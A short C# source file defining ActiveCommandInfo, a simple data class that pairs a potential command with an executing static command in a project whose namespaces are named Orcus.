using Orcus.Plugins.StaticCommands;
using Orcus.Shared.DynamicCommands;

namespace Orcus.StaticCommandManagement;

public class ActiveCommandInfo
{
	public PotentialCommand PotentialCommand { get; }

	public ActiveStaticCommand ExecutingCommand { get; }

	public ActiveCommandInfo(PotentialCommand potentialCommand, ActiveStaticCommand executingCommand)
	{
		PotentialCommand = potentialCommand;
		ExecutingCommand = executingCommand;
	}
}
